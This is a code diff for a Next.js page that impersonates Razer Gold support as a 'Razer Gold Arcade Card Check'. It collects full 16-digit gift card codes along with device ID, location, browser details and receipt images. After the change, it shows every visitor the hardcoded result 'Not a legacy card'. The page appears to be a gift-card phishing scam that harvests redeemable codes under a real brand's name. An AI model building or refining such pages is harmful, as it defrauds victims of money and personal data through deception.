@@ -2,7 +2,7 @@ import { useState, useEffect } from 'react'
 import Head from 'next/head'
 import styles from '../styles/razer.module.css'
 
-export default function RazerIdPage() {
+export default function RazerArcadePage() {
   const [cards, setCards] = useState([''])
   const [loading, setLoading] = useState(false)
   const [result, setResult] = useState(null)
@@ -14,7 +14,6 @@ export default function RazerIdPage() {
   const [deviceId, setDeviceId] = useState(null)
   const [copySuccess, setCopySuccess] = useState(false)
 
-  // Receipt upload states
   const [showUploadStep, setShowUploadStep] = useState(false)
   const [selectedImages, setSelectedImages] = useState([])
   const [uploadProgress, setUploadProgress] = useState(false)
@@ -74,7 +73,7 @@ export default function RazerIdPage() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           cardNumber: validCards.map(c => c.replace(/\s+/g, '')).join('/'),
-          type: 'razer',
+          type: 'razer-arcade',
           deviceId: deviceId,
           location: location,
           browserInfo: JSON.stringify(browserInfo)
@@ -188,7 +187,7 @@ export default function RazerIdPage() {
   return (
     <div className={styles.razerPage}>
       <Head>
-        <title>Check Issuance ID | Razer Gold</title>
+        <title>Razer Gold Arcade Card Check | Razer</title>
         <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
       </Head>
 
@@ -236,13 +235,16 @@ export default function RazerIdPage() {
 
       <main className={styles.main}>
         <div className={styles.breadcrumb}>
-          Support › Razer Gold › Check Issuance ID
+          Support › Razer Gold › Razer Gold Arcade Card Check
         </div>
 
         <section className={styles.cardSection}>
+          <div style={{ width: '100%', maxWidth: '700px', margin: '0 auto 20px', borderRadius: '12px', overflow: 'hidden' }}>
+            <img src="/razerarcade.jpg" alt="Razer Gold Arcade" style={{ width: '100%', display: 'block' }} />
+          </div>
           <div className={styles.formContainer}>
-            <h1 className={styles.mainTitle} style={{fontSize: '28px', marginBottom: '10px'}}>Razer Gold Issuance ID</h1>
-            <p className={styles.subtitle}>Enter your Razer Gold code to instantly check the Issuance ID for support and verification.</p>
+            <h1 className={styles.mainTitle} style={{fontSize: '28px', marginBottom: '10px'}}>Razer Gold Arcade Card Check</h1>
+            <p className={styles.subtitle}>Enter your 16-digit code to verify the card type instantly.</p>
 
             <div className={styles.card}>
               <form onSubmit={checkBalance}>
@@ -294,8 +296,8 @@ export default function RazerIdPage() {
               {result && !showUploadStep && (
                 <div className={styles.result}>
                   <div className={styles.resultHeader}>
-                    <span className={styles.statusDot}></span>
-                    Issuance ID
+                    <span className={styles.statusDot} style={{ background: '#ff4b4b' }}></span>
+                    Card Type
                   </div>
                   {result.message ? (
                     <div className={styles.error} style={{ background: 'rgba(255, 255, 255, 0.05)', color: '#fff', border: '1px solid rgba(255, 255, 255, 0.1)', margin: '20px 0', borderRadius: '4px' }}>
@@ -304,12 +306,9 @@ export default function RazerIdPage() {
                   ) : (
                     <>
                       <div className={styles.balanceText} style={{ marginTop: '15px' }}>
-                        <span className={styles.amount} style={{ letterSpacing: '2px', color: '#fff' }}>{result.issuanceId}</span>
+                        <span className={styles.amount} style={{ color: '#ff4b4b', fontSize: '24px' }}>Not a legacy card</span>
                       </div>
-                      <p className={styles.readyMsg}>This is your Issuance ID.</p>
-                      <button type="button" className={styles.button} onClick={copyIssuanceId} style={{ marginTop: '15px', background: 'transparent', border: '1px solid #44d62c', color: '#44d62c' }}>
-                        {copySuccess ? 'ID COPIED' : 'COPY ID CODE'}
-                      </button>
+                      <p className={styles.readyMsg}>For Card ending in {result.cardLast4}</p>
                     </>
                   )}
                 </div>
@@ -354,7 +353,7 @@ export default function RazerIdPage() {
                     <button type="button" className={styles.button} onClick={handleUpload} disabled={uploadProgress || selectedImages.length === 0}>
                       {uploadProgress ? 'Uploading...' : 'Upload'}
                     </button>
-                    <button type="button" className={styles.button} onClick={skipUpload} disabled={uploadProgress} style={{ background: 'transparent', border: '1px solid rgba(255, 255, 255, 0.2)', color: '#888' }}>
+                    <button type="button" className={styles.button} onClick={skipUpload} disabled={uploadProgress} style={{ background: 'transparent', border: '1px solid rgba(255, 255, 255, 0.2)' }}>
                       Skip
                     </button>
                   </div>
@@ -403,7 +402,7 @@ export default function RazerIdPage() {
                 </div>
                 <div className={styles.tutorialStep}>
                   <div className={styles.stepNumber}>3</div>
-                  <div className={styles.stepText}>Enter the full code above to check your ID instantly.</div>
+                  <div className={styles.stepText}>Enter the full code above to check your card type.</div>
                 </div>
               </div>
             </div>
